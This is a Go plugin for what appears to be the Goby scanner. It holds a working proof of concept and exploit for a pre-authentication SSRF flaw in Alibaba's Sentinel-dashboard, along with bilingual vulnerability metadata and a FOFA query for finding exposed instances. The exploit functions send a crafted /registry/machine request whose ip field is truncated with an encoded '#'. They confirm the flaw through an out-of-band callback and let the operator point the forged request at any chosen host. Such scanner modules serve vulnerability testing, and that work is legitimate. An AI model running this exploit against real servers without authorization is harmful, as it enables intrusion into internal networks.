package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Sentinel Sentinel-dashboard SSRF",
    "Description": "<p>Sentinel is a powerful flow control component issued by Alibaba, which can realize the reliability, flexibility and monitoring of microservices.</p><p>The Sentinel control platform Sentinel-dashboard has a pre-authentication SSRF vulnerability. There is no verification in the ip field, and it can be truncated by passing #. Attackers can perform SSRF attacks through this interface.</p>",
    "Impact": "Sentinel Sentinel-dashboard SSRF",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/alibaba/Sentinel\">https://github.com/alibaba/Sentinel</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Sentinel",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "Sentinel Sentinel-dashboard SSRF漏洞",
            "Description": "<p>Sentinel是阿里巴巴发行的一个强大的流量控制组件，可实现微服务的可靠性、弹性和监控平台。</p><p>Sentinel 管控平台 Sentinel-dashboard 存在认证前 SSRF 漏洞，ip字段无任何验证，通过#就可以截断，攻击者可通过该接口进行 SSRF 攻击。</p>",
            "Impact": "<p>Sentinel 管控平台 Sentinel-dashboard 存在认证前 SSRF 漏洞，ip字段无任何验证，通过#就可以截断，攻击者可通过该接口进行 SSRF 攻击。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/alibaba/Sentinel\">https://github.com/alibaba/Sentinel</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Sentinel",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Sentinel Sentinel-dashboard SSRF",
            "Description": "<p>Sentinel is a powerful flow control component issued by Alibaba, which can realize the reliability, flexibility and monitoring of microservices.</p><p>The Sentinel control platform Sentinel-dashboard has a pre-authentication SSRF vulnerability. There is no verification in the ip field, and it can be truncated by passing #. Attackers can perform SSRF attacks through this interface.</p>",
            "Impact": "Sentinel Sentinel-dashboard SSRF",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/alibaba/Sentinel\">https://github.com/alibaba/Sentinel</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Sentinel",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "body=\"Sentinel Dashboard\"",
    "GobyQuery": "body=\"Sentinel Dashboard\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/alibaba/Sentinel",
    "DisclosureDate": "2021-11-23",
    "References": [
        "https://github.com/alibaba/Sentinel/issues/2451"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "ssrf",
            "type": "input",
            "value": "xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Sentinel"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10238"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri := fmt.Sprintf("/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=%s%%23&port=80", checkUrl)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "success") {
					return godclient.PullExists(checkStr, time.Second*15)
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["ssrf"].(string)
			uri := fmt.Sprintf("/registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip=%s%%23&port=80", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = "it is a blind ssrf\n" + resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
